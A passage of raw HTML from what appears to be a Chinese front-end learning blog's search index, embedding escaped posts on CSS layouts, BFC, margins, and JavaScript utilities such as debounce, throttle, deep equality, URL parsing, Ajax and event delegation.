    &amp;lt;/div&amp;gt;
    &amp;lt;div id=&amp;quot;right&amp;quot; class=&amp;quot;col&amp;quot;&amp;gt;
        this is right
    &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://juejin.cn/post/6844903962529759239#heading-26&#34;&gt;CSS如何实现双飞翼布局&lt;/a&gt;&lt;/p&gt;
">119-css-4-双飞翼布局</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/css-sheng-bei-bu-ju/"" data-c="
          &lt;h2 id=&#34;要求&#34;&gt;要求&lt;/h2&gt;
&lt;p&gt;左右宽度固定，中间宽度自适应&lt;/p&gt;
&lt;h2 id=&#34;实现&#34;&gt;实现&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
    &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;ie=edge&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;圣杯布局&amp;lt;/title&amp;gt;
    &amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;
        body {
            min-width: 550px;
        }
        #header {
            text-align: center;
            background-color: #f1f1f1;
        }

        #container {
            padding-left: 200px;
            padding-right: 150px;
        }
        #container .column {
            float: left;
        }

        #center {
            background-color: #ccc;
            width: 100%;
        }
        #left {
            position: relative;
            background-color: yellow;
            width: 200px;
            margin-left: -100%;
            right: 200px;
        }
        #right {
            background-color: red;
            width: 150px;
            margin-right: -150px;
        }

        #footer {
            text-align: center;
            background-color: #f1f1f1;
        }

        /* 手写 clearfix */
        .clearfix:after {
            content: &#39;&#39;;
            display: table;
            clear: both;
        }
    &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;div id=&amp;quot;header&amp;quot;&amp;gt;this is header&amp;lt;/div&amp;gt;
    &amp;lt;div id=&amp;quot;container&amp;quot; class=&amp;quot;clearfix&amp;quot;&amp;gt;
        &amp;lt;div id=&amp;quot;center&amp;quot; class=&amp;quot;column&amp;quot;&amp;gt;this is center&amp;lt;/div&amp;gt;
        &amp;lt;div id=&amp;quot;left&amp;quot; class=&amp;quot;column&amp;quot;&amp;gt;this is left&amp;lt;/div&amp;gt;
        &amp;lt;div id=&amp;quot;right&amp;quot; class=&amp;quot;column&amp;quot;&amp;gt;this is right&amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;
    &amp;lt;div id=&amp;quot;footer&amp;quot;&amp;gt;this is footer&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;效果&#34;&gt;效果&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1631716817057.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;讲解&#34;&gt;讲解&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;margin-left: -100%;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1、100%是相对于父元素的宽度&lt;/p&gt;
&lt;p&gt;2、要理解它，可以先把父元素的padding值去掉。&lt;/p&gt;
&lt;p&gt;3、可以看到，left区域占据最左端，左边和父元素的左边重合。&lt;/p&gt;
&lt;p&gt;即从区域范围外，向左移动父元素的100%&lt;/p&gt;
&lt;p&gt;4、此时，再加上父元素的padding值。&lt;/p&gt;
&lt;p&gt;同理，left区域占据可视范围内的最左边。&lt;/p&gt;
&lt;p&gt;5、移动相对位置&lt;/p&gt;
&lt;p&gt;第三步图示：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1631716828211.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://juejin.cn/post/6844903962529759239#heading-20&#34;&gt;CSS如何进行圣杯布局&lt;/a&gt;&lt;/p&gt;
">118-css-3-圣杯布局</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/css-bfc/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;块格式化上下文（Block Formatting Context，BFC）&lt;/strong&gt; 是Web页面的可视CSS渲染的一部分，是块盒子的布局过程发生的区域，也是浮动元素与其他元素交互的区域。&lt;/p&gt;
&lt;h2 id=&#34;形成-bfc-的常见条件&#34;&gt;形成 BFC 的常见条件&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;float 不是 none&lt;/li&gt;
&lt;li&gt;position 是 absolute 或 fixed&lt;/li&gt;
&lt;li&gt;overflow 不是 visible&lt;/li&gt;
&lt;li&gt;display 是 flex inline-block等&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;作用&#34;&gt;作用&lt;/h2&gt;
&lt;h3 id=&#34;清除浮动&#34;&gt;清除浮动&lt;/h3&gt;
&lt;p&gt;为父盒子设置 overflow: hidden;&lt;br&gt;
overflow: hidden;使父元素产生了一个BFC，BFC的高度计算包括其内部浮动的元素，从而达到清除浮动的效果&lt;/p&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context&#34;&gt;https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context&lt;/a&gt;&lt;/p&gt;
">117-css-2-BFC</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/css-margin/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;margin&lt;/code&gt; 属性为给定元素设置所有四个（上下左右）方向的外边距属性。&lt;/p&gt;
&lt;p&gt;外边距控制的是元素外部空出的空间。相反，padding操作元素&lt;em&gt;内部&lt;/em&gt;空出的空间。&lt;/p&gt;
&lt;h2 id=&#34;重叠&#34;&gt;重叠&lt;/h2&gt;
&lt;p&gt;上下元素的下上外边距有时会重叠，实际空出的空间长度变为两外边距中的较长值。&lt;/p&gt;
&lt;h2 id=&#34;负值&#34;&gt;负值&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;margin-top 和 margin-left 负值，元素向上、向左移动&lt;/li&gt;
&lt;li&gt;margin-right 负值，右侧元素左移，自身不受影响&lt;/li&gt;
&lt;li&gt;margin-bottom 负值，下方元素上移，自身不受影响&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;水平居中&#34;&gt;水平居中&lt;/h2&gt;
&lt;p&gt;在现代浏览器中实现水平居中，可以使用 &lt;code&gt;display: flex; justify-content: center;&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;不过，在 IE8-9 这样的不支持弹性盒布局的旧式浏览器中，上述代码并不会生效。此时要实现在父元素中居中，可使用 &lt;code&gt;margin: 0 auto;&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin&#34;&gt;https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin&lt;/a&gt;&lt;/p&gt;
">116-css-1-margin</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-webapi-window-fang-fa-requestanimationframe/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;window.requestAnimationFrame()&lt;/code&gt;告诉浏览器——你希望执行一个动画，并且要求浏览器在下次重绘之前调用指定的回调函数更新动画。该方法需要传入一个回调函数作为参数，该回调函数会在浏览器下一次重绘之前执行&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
    &amp;lt;head&amp;gt;
        &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
        &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
        &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;ie=edge&amp;quot;&amp;gt;
        &amp;lt;title&amp;gt;JS 真题演示&amp;lt;/title&amp;gt;

        &amp;lt;style&amp;gt;
            #div1 {
                width: 100px;
                height: 50px;
                background-color: red;
            }
        &amp;lt;/style&amp;gt;
    &amp;lt;/head&amp;gt;
    &amp;lt;body&amp;gt;
        &amp;lt;p&amp;gt;JS 真题演示&amp;lt;/p&amp;gt;

        &amp;lt;div id=&amp;quot;div1&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;

        &amp;lt;script src=&amp;quot;https://cdn.bootcss.com/jquery/3.4.0/jquery.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
        &amp;lt;script src=&amp;quot;./RAF.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 3s 把宽度从 100px 变为 640px ，即增加 540px
// 60帧/s ，3s 180 帧 ，每次变化 3px

const $div1 = $(&#39;#div1&#39;)
let curWidth = 100
const maxWidth = 640

// // setTimeout
// function animate() {
//     curWidth = curWidth + 3
//     $div1.css(&#39;width&#39;, curWidth)
//     if (curWidth &amp;lt; maxWidth) {
//         setTimeout(animate, 16.7) // 自己控制时间
//     }
// }
// animate()

// RAF
function animate() {
    curWidth = curWidth + 3
    $div1.css(&#39;width&#39;, curWidth)
    if (curWidth &amp;lt; maxWidth) {
        window.requestAnimationFrame(animate) // 时间不用自己控制
    }
}
animate()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame&#34;&gt;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame&lt;/a&gt;&lt;/p&gt;
">115-js-31-window方法requestAnimationFrame</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-shu-zu-qu-chong/"" data-c="
          &lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 传统方式
function unique(arr) {
    const res = []
    arr.forEach(item =&amp;gt; {
        if (res.indexOf(item) &amp;lt; 0) {
            res.push(item)
        }
    })
    return res
}

// 使用 Set （无序，不能重复）
function unique(arr) {
    const set = new Set(arr)
    return [...set]
}

const res = unique([30, 10, 20, 30, 40, 10])
console.log(res)

&lt;/code&gt;&lt;/pre&gt;
">114-js-30-实例数组去重</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-shi-li-jie-xi-url-can-shu/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;不想看正则，以后复习再看&lt;/p&gt;
&lt;h2 id=&#34;获取参数值&#34;&gt;获取参数值&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 传统方式
function query(name) {
    const search = location.search.substr(1) // 类似 array.slice(1)
    // search: &#39;a=10&amp;amp;b=20&amp;amp;c=30&#39;
    const reg = new RegExp(`(^|&amp;amp;)${name}=([^&amp;amp;]*)(&amp;amp;|$)`, &#39;i&#39;)
    const res = search.match(reg)
    if (res === null) {
        return null
    }
    return res[2]
}
query(&#39;d&#39;)

// URLSearchParams
function query(name) {
    const search = location.search
    const p = new URLSearchParams(search)
    return p.get(name)
}
console.log( query(&#39;b&#39;) )

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;url参数解析为js对象&#34;&gt;url参数解析为js对象&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// url参数解析为js对象

// 传统方式，分析search
function queryToObj() {
  const res = {}
  const search = location.search.substr(1) // 去掉前面的`?`
  search.split(&#39;&amp;amp;&#39;).forEach(paramStr =&amp;gt; {
    const arr = paramStr.split(&#39;=&#39;)
    const key = arr[0]
    const val = arr[1]
    res[key] = val
  })
  return res
}

// 使用URLSearchParams
function queryToObj() {
  const res = {}
  const pList = new URLSearchParams(location.search)
  pList.forEach((val, key) =&amp;gt; {
    res[key] = val
  })
  return res
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;mdn&#34;&gt;MDN&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;URLSearchParams&lt;/code&gt; 接口定义了一些实用的方法来处理 URL 的查询字符串。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var paramsString = &amp;quot;q=URLUtils.searchParams&amp;amp;topic=api&amp;quot;
var searchParams = new URLSearchParams(paramsString);

for (let p of searchParams) {
  console.log(p);
}

// [&#39;q&#39;, &#39;URLUtils.searchParams&#39;]
// [&#39;topic&#39;, &#39;api&#39;]

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams&#34;&gt;https://developer.mozilla.org/zh-CN/docs/Web/API/URLSearchParams&lt;/a&gt;&lt;/p&gt;
">113-js-29-实例解析url参数</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/js-shou-xie-max/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;获取多个数字中的最大值&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function max() {
  const nums = Array.prototype.slice.call(arguments) // 变为数组
  let max = 0
  nums.forEach(n =&amp;gt; {
    if (n &amp;gt; max) {
      max = n
    }
  })
  return max
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;感受&#34;&gt;感受&lt;/h2&gt;
&lt;p&gt;换一种写法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function max(...array) {
  const length = array == null ? 0 : array.length
  return length
    ? array.reduce((acc,cur) =&amp;gt; {
      return acc &amp;gt; cur ? acc : cur
    })
    : void 0
}
max(1,2,3)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;当然没必要&#34;&gt;当然没必要&lt;/h2&gt;
&lt;p&gt;直接用Math.max()就好&lt;/p&gt;
">112-js-28-手写max</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/js-shou-xie-trim/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;原型，this,正则&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;String.prototype.trim = function() {
  return this.replace(/^\s+/,&#39;&#39;).replace(/\s+$/,&#39;&#39;)
}
&lt;/code&gt;&lt;/pre&gt;
">111-js-27-手写trim</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/js-shou-xie-isequal/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;比较两个对象或数组是否属性值全部一致&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 判断是否是对象或数组
function isObject(obj) {
    return typeof obj === &#39;object&#39; &amp;amp;&amp;amp; obj !== null
}
// 全相等（深度）
function isEqual(obj1, obj2) {
    if (!isObject(obj1) || !isObject(obj2)) {
        // 值类型（注意，参与 equal 的一般不会是函数）
        return obj1 === obj2
    }
    if (obj1 === obj2) {
        return true
    }
    // 两个都是对象或数组，而且不相等
    // 1. 先取出 obj1 和 obj2 的 keys ，比较个数
    const obj1Keys = Object.keys(obj1)
    const obj2Keys = Object.keys(obj2)
    if (obj1Keys.length !== obj2Keys.length) {
        return false
    }
    // 2. 以 obj1 为基准，和 obj2 一次递归比较
    for (let key in obj1) {
        // 比较当前 key 的 val —— 递归！！！
        const res = isEqual(obj1[key], obj2[key])
        if (!res) {
            return false
        }
    }
    // 3. 全相等
    return true
}

// 测试
const obj1 = {
    a: 100,
    b: {
        x: 100,
        y: 200
    }
}
const obj2 = {
    a: 100,
    b: {
        x: 100,
        y: 200
    }
}
// console.log( obj1 === obj2 )
console.log( isEqual(obj1, obj2) )

const arr1 = [1, 2, 3]
const arr2 = [1, 2, 3, 4]

&lt;/code&gt;&lt;/pre&gt;
">110-js-26-手写isEqual</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/js-shou-xie-throttle/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;当拖拽事件执行时，频率太快，减少事件的执行次数，以一个固定频率来执行。&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const div1 = document.getElementById(&#39;div1&#39;)

let timer = null
div1.addEventListener(&#39;drag&#39;, function (e) {
    if (timer) {
        return
    }
    timer = setTimeout(() =&amp;gt; {
        console.log(e.offsetX, e.offsetY)

        timer = null
    }, 100)
})
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const div1 = document.getElementById(&#39;div1&#39;)

// 节流
function throttle(fn, delay = 100) {
    let timer = null

    return function () {
        if (timer) {
            return
        }
        timer = setTimeout(() =&amp;gt; {
            fn.apply(this, arguments)
            timer = null
        }, delay)
    }
}

div1.addEventListener(&#39;drag&#39;, throttle(function (e) {
    console.log(e.offsetX, e.offsetY)
}))
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;apply&#34;&gt;apply&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;div1.addEventListener(&#39;drag&#39;, function(event) {

})
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;fn.apply(this, arguments)&lt;/code&gt;:由上述代码可知，arguments参数是传递到throttle返回的函数中的，所以需要将参数传递给fn&lt;/p&gt;
">109-js-25-手写throttle</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/js-shou-xie-debounce/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;输入框中防止连续触发事件，用户输入结束或暂停时再触发&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const input1 = document.getElementById(&#39;input1&#39;)

let timer = null
input1.addEventListener(&#39;keyup&#39;, function () {
    if (timer) {
        clearTimeout(timer)
    }
    timer = setTimeout(() =&amp;gt; {
        // 模拟触发 change 事件
        console.log(input1.value)

        // 清空定时器
        timer = null
    }, 500)
})
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const input1 = document.getElementById(&#39;input1&#39;)

// 防抖
function debounce(fn, delay = 500) {
    // timer 是闭包中的
    let timer = null

    return function () {
        if (timer) {
            clearTimeout(timer)
        }
        timer = setTimeout(() =&amp;gt; {
            fn.apply(this, arguments)
            timer = null
        }, delay)
    }
}

input1.addEventListener(&#39;keyup&#39;, debounce(function (e) {
    console.log(e.target)
    console.log(input1.value)
}, 600))
&lt;/code&gt;&lt;/pre&gt;
">108-js-24-手写debounce</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-webapi-ajax/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;ajax&lt;/code&gt;是一种技术方案，但并不是一种&lt;strong&gt;新技术&lt;/strong&gt;。它依赖的是现有的&lt;code&gt;CSS&lt;/code&gt;/&lt;code&gt;HTML&lt;/code&gt;/&lt;code&gt;Javascript&lt;/code&gt;，而其中最核心的依赖是浏览器提供的&lt;code&gt;XMLHttpRequest&lt;/code&gt;对象，是这个对象使得浏览器可以发出&lt;code&gt;HTTP&lt;/code&gt;请求与接收&lt;code&gt;HTTP&lt;/code&gt;响应。&lt;/p&gt;
&lt;p&gt;所以我用一句话来总结两者的关系：我们使用&lt;code&gt;XMLHttpRequest&lt;/code&gt;对象来发送一个&lt;code&gt;Ajax&lt;/code&gt;请求。&lt;/p&gt;
&lt;h2 id=&#34;xmlhttprequest&#34;&gt;XMLHttpRequest&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const xhr = new XMLHttpRequest()
xhr.open(&#39;GET&#39;, &#39;/data/test.json&#39;, true)
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
        if (xhr.status === 200) {
            // console.log(
            //     JSON.parse(xhr.responseText)
            // )
            alert(xhr.responseText)
        } else if (xhr.status === 404) {
            console.log(&#39;404 not found&#39;)
        }
    }
}
xhr.send(null)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;手写简易ajax&#34;&gt;手写简易ajax&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function ajax(url) {
    const p = new Promise((resolve, reject) =&amp;gt; {
        const xhr = new XMLHttpRequest()
        xhr.open(&#39;GET&#39;, url, true)
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    resolve(
                        JSON.parse(xhr.responseText)
                    )
                } else if (xhr.status === 404 || xhr.status === 500) {
                    reject(new Error(&#39;404 not found&#39;))
                }
            }
        }
        xhr.send(null)
    })
    return p
}

const url = &#39;/data/test.json&#39;
ajax(url)
.then(res =&amp;gt; console.log(res))
.catch(err =&amp;gt; console.error(err))
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://juejin.cn/post/6844903469896171533&#34;&gt;Ajax 知识体系大梳理&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://segmentfault.com/a/1190000004322487&#34;&gt;你真的会使用&lt;code&gt;XMLHttpRequest&lt;/code&gt;吗&lt;/a&gt;&lt;/p&gt;
">107-js-23-Ajax</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-webapi-shi-jian/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;事件绑定：普通绑定和代理绑定&lt;/p&gt;
&lt;p&gt;事件冒泡&lt;/p&gt;
&lt;h2 id=&#34;事件绑定&#34;&gt;事件绑定&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 通用的事件绑定函数
function bindEvent(elem, type, fn) {
    elem.addEventListener(type, fn)
}

// 普通绑定
const btn1 = document.getElementById(&#39;btn1&#39;)
bindEvent(btn1, &#39;click&#39;, function (event) {
    // console.log(event.target) // 获取触发的元素
    event.preventDefault() // 阻止默认行为
    alert(this.innerHTML)
})
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;事件冒泡&#34;&gt;事件冒泡&lt;/h2&gt;
&lt;p&gt;事件冒泡：由触发元素一层一层向上传递&lt;/p&gt;
&lt;p&gt;阻止事件冒泡：&lt;code&gt;event.stopPropagation()&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;div id=&amp;quot;div1&amp;quot;&amp;gt;
    &amp;lt;p id=&amp;quot;p1&amp;quot;&amp;gt;激活&amp;lt;/p&amp;gt;
    &amp;lt;p id=&amp;quot;p2&amp;quot;&amp;gt;取消&amp;lt;/p&amp;gt;
    &amp;lt;p id=&amp;quot;p3&amp;quot;&amp;gt;取消&amp;lt;/p&amp;gt;
    &amp;lt;p id=&amp;quot;p4&amp;quot;&amp;gt;取消&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div id=&amp;quot;div2&amp;quot;&amp;gt;
    &amp;lt;p id=&amp;quot;p5&amp;quot;&amp;gt;取消&amp;lt;/p&amp;gt;
    &amp;lt;p id=&amp;quot;p6&amp;quot;&amp;gt;取消&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const p1 = document.getElementById(&#39;p1&#39;)
bindEvent(p1, &#39;click&#39;, event =&amp;gt; {
    // event.stopPropagation() // 阻止冒泡
    console.log(&#39;激活&#39;)
})
const body = document.body
bindEvent(body, &#39;click&#39;, event =&amp;gt; {
    console.log(&#39;body clicked&#39;)
    console.log(event.target)
})
const div2 = document.getElementById(&#39;div2&#39;)
bindEvent(div2, &#39;click&#39;, event =&amp;gt; {
    console.log(&#39;div2 clicked&#39;)
    console.log(event.target)
})
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;事件代理&#34;&gt;事件代理&lt;/h2&gt;
&lt;p&gt;由于冒泡机制，所以事件会传递到触发元素的父级元素，不需要使用循环为每个同级元素添加事件。&lt;/p&gt;
&lt;p&gt;当许多同级元素都需要相同的事件行为时，将事件加在他们的父元素上，比如瀑布流。&lt;/p&gt;
&lt;p&gt;由于父级元素可能包含其他的元素，不需要添加事件，所以需要区分。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function bindEvent(elem, type, selector, fn) {
    if (fn == null) {
        fn = selector
        selector = null
    }
    elem.addEventListener(type, event =&amp;gt; {
        const target = event.target
        if (selector) {
            // 代理绑定
            if (target.matches(selector)) {
                fn.call(target, event)
            }
        } else {
            // 普通绑定
            fn.call(target, event)
        }
    })
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;div id=&amp;quot;div3&amp;quot;&amp;gt;
    &amp;lt;a href=&amp;quot;#&amp;quot;&amp;gt;a1&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
    &amp;lt;a href=&amp;quot;#&amp;quot;&amp;gt;a2&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
    &amp;lt;a href=&amp;quot;#&amp;quot;&amp;gt;a3&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
    &amp;lt;a href=&amp;quot;#&amp;quot;&amp;gt;a4&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
    &amp;lt;button&amp;gt;加载更多...&amp;lt;/button&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 代理绑定
const div3 = document.getElementById(&#39;div3&#39;)
bindEvent(div3, &#39;click&#39;, &#39;a&#39;, function (event) {
    event.preventDefault()
    alert(this.innerHTML)
})
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;targetmatchesselector&#34;&gt;&lt;code&gt;target.matches(selector)&lt;/code&gt;&lt;/h3&gt;
&lt;h4 id=&#34;mdn&#34;&gt;MDN&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Element.matches()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果元素被指定的选择器字符串选择，&lt;code&gt;Element.matches()&lt;/code&gt;方法返回true; 否则返回false。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let result = element.matches(selectorString);
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;result&lt;/code&gt; 的值为 &lt;code&gt;true&lt;/code&gt; 或 &lt;code&gt;false&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;selectorString&lt;/code&gt; 是个css选择器字符串.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;示例&#34;&gt;示例&lt;/h4&gt;
&lt;p&gt;比如我们有这样的一个 HTML 片段：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;ul id=&amp;quot;list&amp;quot;&amp;gt;
  &amp;lt;li&amp;gt;item 1&amp;lt;/li&amp;gt;
  &amp;lt;li&amp;gt;item 2&amp;lt;/li&amp;gt;
